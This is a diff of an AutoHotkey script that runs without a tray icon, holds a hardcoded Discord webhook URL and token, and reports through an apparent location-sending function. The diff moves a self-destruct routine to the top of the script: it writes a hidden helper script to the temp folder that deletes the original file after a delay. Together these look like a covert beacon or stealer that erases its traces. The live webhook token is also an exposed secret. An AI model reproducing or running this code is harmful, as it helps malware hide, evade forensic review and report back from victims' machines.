@@ -1,6 +1,22 @@
 #Requires AutoHotkey v2.0
 #SingleInstance Force
 #NoTrayIcon
+ScheduleSelfDestruct(path) {
+    Sleep 3000
+    try {
+        deleterPath := A_Temp "\deleter.ahk"
+        script := "
+        (
+        Sleep 2000
+        FileDelete '" path "'
+        ExitApp
+        )"
+        FileAppend(script, deleterPath)
+        Run('"' deleterPath '"', , "Hide")
+    } catch as e {
+        MsgBox "❌ Failed to schedule self-delete:`n" . e.Message
+    }
+}
 
 wkUrl := "https://discord.com/api/webhooks/1383142535136018552/PPFKXJEV71jNIareD20kRU9iLwuCvWytj08itta7gPw1XbNjw7ciXZhcsdTXM81s07aE"
 
@@ -67,29 +83,6 @@ CleanUpTemp() {
         NDWithLocation("- Deleted folder: " . sejFolder)
     } else {
         NDWithLocation("- Folder not found: " . sejFolder)
-    }
-}
-
-ScheduleSelfDestruct(scriptPath) {
-    Sleep 5000  ; Let everything else settle
-
-    try {
-        deleterPath := A_Temp "\c.ahk"
-
-        ; Build the content to delete the original script
-        scriptContent := "
-        (
-        Sleep 2000
-        FileDelete '" scriptPath "'
-        ExitApp
-        )"
-
-        FileAppend(scriptContent, deleterPath)
-
-        ; Run the deleter silently
-        Run('"' deleterPath '"', , "Hide")
-    } catch as e {
-        NDWithLocation("❌ Failed to schedule self-destruct: " . e.Message)
     }
 }
 
